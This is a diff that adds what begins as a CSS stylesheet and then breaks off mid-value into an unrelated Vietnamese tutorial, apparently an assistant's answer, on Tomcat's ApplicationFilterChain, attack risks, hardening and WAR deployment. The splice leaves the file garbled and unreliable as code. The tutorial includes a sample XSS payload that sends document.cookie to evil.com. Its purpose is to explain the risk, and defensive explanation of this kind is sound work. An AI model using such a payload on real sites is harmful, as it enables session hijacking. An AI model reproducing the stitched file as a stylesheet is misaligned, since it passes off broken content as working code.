@@ -1,0 +1,226 @@
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f4f4f4;
+}
+
+.container {
+    max-width: 600px;
+    margin: 50px auto;
+    padding: 20px;
+    background: white;
+    border-radius: 5px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+
+h1 {
+    color: #333;
+    text-align: center;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+
+label {
+    font-weight: bold;
+}
+
+input[type="text"] {
+    padding: 8px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
+
+button {
+    padding: 10px;
+    background-color: #007bff;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #0056b3;
+}
+
+a {
+    display: block;
+    text-align: center;
+    margin-top: 20px;
+    color: #007耗材
+
+---
+
+### Phần 2: Giải thích về ApplicationFilterChain và Lỗ hổng Bảo mật
+
+#### ApplicationFilterChain là gì?
+**ApplicationFilterChain** là một lớp trong Tomcat chịu trách nhiệm quản lý chuỗi các **Filter** (bộ lọc) được áp dụng cho một yêu cầu HTTP trước khi nó được xử lý bởi Servlet. Mỗi Filter có thể thực hiện các tác vụ như xác thực, ghi log, hoặc sửa đổi yêu cầu/phản hồi. Sau khi tất cả các Filter được thực thi, FilterChain chuyển yêu cầu đến Servlet mục tiêu.
+
+#### Lỗ hổng tiềm ẩn liên quan đến ApplicationFilterChain
+Mặc dù bản thân `ApplicationFilterChain` không phải là một lỗ hổng, nhưng nếu các Filter hoặc Servlet không được cấu hình đúng, kẻ tấn công có thể khai thác các vấn đề sau:
+
+1. **Lọc đầu vào không đầy đủ**: Nếu Filter không kiểm tra hoặc làm sạch dữ liệu đầu vào (ví dụ: tham số `username` trong form), kẻ tấn công có thể thực hiện tấn công như **SQL Injection**, **Cross-Site Scripting (XSS)**, hoặc **Command Injection**.
+2. **Quyền truy cập trái phép**: Filter không thực thi xác thực hoặc phân quyền đúng cách có thể cho phép kẻ tấn công truy cập các tài nguyên nhạy cảm.
+3. **Bỏ qua Filter**: Trong một số trường hợp, cấu hình sai của Filter hoặc Servlet có thể cho phép kẻ tấn công bỏ qua các kiểm tra bảo mật bằng cách sử dụng các URL được tạo đặc biệt.
+4. **Lỗi cấu hình Tomcat**: Các cấu hình sai trong `server.xml` hoặc `web.xml` (như bỏ qua xác thực hoặc để lộ thông tin nhạy cảm) có thể bị khai thác.
+5. **Tấn công từ chối dịch vụ (DoS)**: Kẻ tấn công có thể gửi nhiều yêu cầu phức tạp, làm quá tải chuỗi Filter và gây ra tình trạng từ chối dịch vụ.
+
+#### Cách kẻ tấn công có thể khai thác
+- **XSS qua tham số đầu vào**: Nếu dữ liệu người dùng (như `username`) không được làm sạch, kẻ tấn công có thể chèn mã JavaScript độc hại, ví dụ:
+  ```
+  <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+  ```
+  Điều này có thể đánh cắp cookie phiên của người dùng.
+- **Lợi dụng cấu hình sai**: Nếu Filter không giới hạn quyền truy cập, kẻ tấn công có thể truy cập các endpoint quản trị hoặc tài nguyên nội bộ.
+- **Tấn công CSRF**: Nếu không có token CSRF trong form, kẻ tấn công có thể lừa người dùng gửi yêu cầu POST giả mạo.
+
+---
+
+### Phần 3: Biện pháp Bảo mật để Ngăn chặn Tấn công
+
+Để bảo vệ ứng dụng của bạn khỏi các cuộc tấn công khai thác liên quan đến Filter hoặc Servlet, hãy áp dụng các biện pháp sau:
+
+1. **Làm sạch và kiểm tra đầu vào**:
+   - Sử dụng thư viện như OWASP Java Encoder để mã hóa đầu ra, ngăn chặn XSS.
+   - Kiểm tra tất cả dữ liệu đầu vào (ví dụ: giới hạn độ dài của `username`, chỉ cho phép ký tự chữ và số).
+
+2. **Thêm CSRF Token**:
+   - Thêm token CSRF vào form để ngăn chặn các yêu cầu giả mạo:
+     ```html
+     <input type="hidden" name="csrfToken" value="uniqueToken">
+     ```
+   - Xác minh token này trong Servlet trước khi xử lý POST.
+
+3. **Cấu hình Filter bảo mật**:
+   - Thêm một Filter để kiểm tra xác thực và phân quyền:
+     ```java
+     import jakarta.servlet.*;
+     import jakarta.servlet.annotation.WebFilter;
+     import jakarta.servlet.http.*;
+     import java.io.IOException;
+
+     @WebFilter("/*")
+     public class SecurityFilter implements Filter {
+         public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
+                 throws IOException, ServletException {
+             HttpServletRequest req = (HttpServletRequest) request;
+             HttpServletResponse res = (HttpServletResponse) response;
+
+             // Kiểm tra xác thực (ví dụ: người dùng đã đăng nhập)
+             if (req.getSession().getAttribute("user") == null) {
+                 res.sendRedirect(req.getContextPath() + "/login");
+                 return;
+             }
+
+             chain.doFilter(request, response);
+         }
+
+         public void init(FilterConfig filterConfig) {}
+         public void destroy() {}
+     }
+     ```
+
+4. **Cấu hình Tomcat an toàn**:
+   - Vô hiệu hóa các tính năng không cần thiết trong `server.xml` (ví dụ: cổng shutdown).
+   - Sử dụng HTTPS bằng cách cấu hình connector SSL:
+     ```xml
+     <Connector port="8443" protocol="org.apache.coyote.http11.Http11NioProtocol"
+                maxThreads="150" SSLEnabled="true">
+         <SSLHostConfig>
+             <Certificate certificateKeystoreFile="conf/localhost-rsa.jks"
+                          certificateKeystorePassword="changeit" type="RSA" />
+         </SSLHostConfig>
+     </Connector>
+     ```
+
+5. **Bảo vệ chống DoS**:
+   - Giới hạn số lượng yêu cầu bằng Filter hoặc cấu hình Tomcat:
+     ```xml
+     <Connector port="8080" protocol="HTTP/1.1" connectionTimeout="20000"
+                maxThreads="150" acceptCount="100" />
+     ```
+
+6. **Ghi log và giám sát**:
+   - Sử dụng Valve trong `server.xml` để ghi log truy cập:
+     ```xml
+     <Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs"
+            prefix="localhost_access_log" suffix=".txt"
+            pattern="%h %l %u %t &quot;%r&quot; %s %b" />
+     ```
+   - Giám sát log để phát hiện hành vi bất thường.
+
+---
+
+### Phần 4: Cách Triển khai Ứng dụng trên Tomcat
+
+1. **Tạo cấu trúc dự án**:
+   ```
+   MyServletProject/
+   ├── src/
+   │   └── main/
+   │       ├── java/
+   │       │   └── com/
+   │       │       └── example/
+   │       │           └── UserServlet.java
+   │       └── webapp/
+   │           ├── WEB-INF/
+   │           │   └── web.xml (tuỳ chọn nếu không dùng annotation)
+   │           ├── index.html
+   │           ├── styles.css
+   │           └── script.js
+   ├── pom.xml (nếu dùng Maven)
+   ```
+
+2. **Cấu hình Maven (nếu dùng)**:
+   ```xml
+   <project xmlns="http://maven.apache.org/POM/4.0.0"
+            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+            xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+       <modelVersion>4.0.0</modelVersion>
+       <groupId>com.example</groupId>
+       <artifactId>MyServletProject</artifactId>
+       <version>1.0-SNAPSHOT</version>
+       <packaging>war</packaging>
+
+       <dependencies>
+           <dependency>
+               <groupId>jakarta.servlet</groupId>
+               <artifactId>jakarta.servlet-api</artifactId>
+               <version>5.0.0</version>
+               <scope>provided</scope>
+           </dependency>
+       </dependencies>
+
+       <build>
+           <plugins>
+               <plugin>
+                   <groupId>org.apache.maven.plugins</groupId>
+                   <artifactId>maven-war-plugin</artifactId>
+                   <version>3.3.2</version>
+               </plugin>
+           </plugins>
+       </build>
+   </project>
+   ```
+
+3. **Triển khai trên Tomcat**:
+   - Chạy `mvn clean package` để tạo file `MyServletProject.war` trong thư mục `target`.
+   - Sao chép `MyServletProject.war` vào thư mục `webapps` của Tomcat.
+   - Khởi động Tomcat bằng `startup.sh` hoặc `startup.bat`.
+   - Truy cập:
+     - `http://localhost:8080/MyServletProject/` để xem trang `index.html`.
+     - `http://localhost:8080/MyServletProject/UserServlet` để gọi Servlet.
+
+---
+
+### Kết luận
+- Bạn đã được cung cấp mã cho một Servlet (`UserServlet.java`), một trang HTML (`index.html`), CSS (`styles.css`), và JS (`script.js`) để chạy trên Tomcat.
+- **ApplicationFilterChain** không phải là lỗ hổng trực tiếp, nhưng cấu hình sai hoặc thiếu kiểm tra đầu vào có thể dẫn đến các cuộc tấn công như XSS, CSRF, hoặc truy cập trái phép.
+- Áp dụng các biện pháp bảo mật như làm sạch đầu vào, sử dụng CSRF token, cấu hình Filter an toàn, và sử dụng HTTPS để bảo vệ ứng dụng.
+
+Nếu bạn cần thêm hướng dẫn chi tiết về cách triển khai hoặc bảo mật, hãy cho tôi biết!
